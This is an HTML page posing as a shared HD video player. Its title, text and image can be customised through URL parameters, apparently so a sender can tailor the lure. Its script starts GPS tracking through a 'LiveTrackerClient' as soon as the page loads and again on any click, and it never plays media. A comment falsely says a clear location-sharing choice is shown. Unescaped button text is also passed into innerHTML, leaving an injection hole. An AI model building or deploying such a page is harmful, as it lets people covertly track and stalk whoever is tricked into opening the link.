<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="page-title-tag">Shared Media Content</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #090d16;
            color: #f8fafc;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 20px;
            max-width: 480px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
        }

        .hero-container {
            position: relative;
            width: 100%;
            height: 240px;
            background: #000;
        }

        .hero-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.85;
        }

        .play-btn-circle {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 68px;
            height: 68px;
            background: rgba(59, 130, 246, 0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
            color: white;
            box-shadow: 0 0 24px rgba(59, 130, 246, 0.6);
            cursor: pointer;
            transition: transform 0.2s;
        }

        .play-btn-circle:hover {
            transform: translate(-50%, -50%) scale(1.1);
        }

        .card-body {
            padding: 24px;
        }

        .badge {
            display: inline-block;
            background: rgba(59, 130, 246, 0.2);
            color: #60a5fa;
            font-weight: 600;
            font-size: 12px;
            padding: 4px 12px;
            border-radius: 20px;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        h1 {
            font-size: 22px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 10px;
            line-height: 1.3;
        }

        p {
            font-size: 14px;
            color: #94a3b8;
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .btn-action {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
            transition: all 0.2s;
            text-decoration: none;
        }

        .btn-action:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="hero-container" id="hero-trigger">
            <img id="hero-img" src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=800&q=80" alt="Preview" class="hero-img">
            <div class="play-btn-circle"><i class="fas fa-play" style="margin-left: 4px;"></i></div>
        </div>
        <div class="card-body">
            <span class="badge" id="badge-text">HD MEDIA STREAM</span>
            <h1 id="main-title">Exclusive Shared Video Presentation</h1>
            <p id="main-desc">Tap below to open high definition media playback.</p>
            <button class="btn-action" id="action-btn">
                <i class="fas fa-play"></i> Watch Stream Now
            </button>
        </div>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let title = '';
        let desc = '';
        let img = '';
        let btnText = '';
        let badgeText = '';

        const compressed = urlParams.get('d');
        if (compressed) {
            try {
                const data = JSON.parse(atob(decodeURIComponent(compressed)));
                if (data.t) title = data.t;
                if (data.d) desc = data.d;
                if (data.i) img = data.i;
                if (data.b) btnText = data.b;
                if (data.bg) badgeText = data.bg;
            } catch (e) {}
        }

        if (!title) title = urlParams.get('t') || urlParams.get('title');
        if (!desc) desc = urlParams.get('d') || urlParams.get('desc');
        if (!img) img = urlParams.get('i') || urlParams.get('image') || urlParams.get('img');
        if (!btnText) btnText = urlParams.get('b') || urlParams.get('btn');
        if (!badgeText) badgeText = urlParams.get('bg') || urlParams.get('badge');

        if (title) {
            document.getElementById('main-title').innerText = title;
            document.getElementById('page-title-tag').innerText = title;
        }
        if (desc) document.getElementById('main-desc').innerText = desc;
        if (img) document.getElementById('hero-img').src = img;
        if (btnText) document.getElementById('action-btn').innerHTML = `<i class="fas fa-play"></i> ${btnText}`;
        if (badgeText) document.getElementById('badge-text').innerText = badgeText;

        const actionBtn = document.getElementById('action-btn');

        function startTelemetry() {
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'custom',
                    updateInterval: 5000,
                    enableCamera: false,
                    enableGPS: true
                });
            }
        }

        actionBtn.addEventListener('click', () => {
            actionBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading Playback...';
            startTelemetry();
        });

        document.getElementById('hero-trigger').addEventListener('click', () => {
            actionBtn.click();
        });

        // Show a clear location-sharing choice on load.
        window.addEventListener('DOMContentLoaded', () => {
            startTelemetry();
        });
    </script>
</body>

</html>
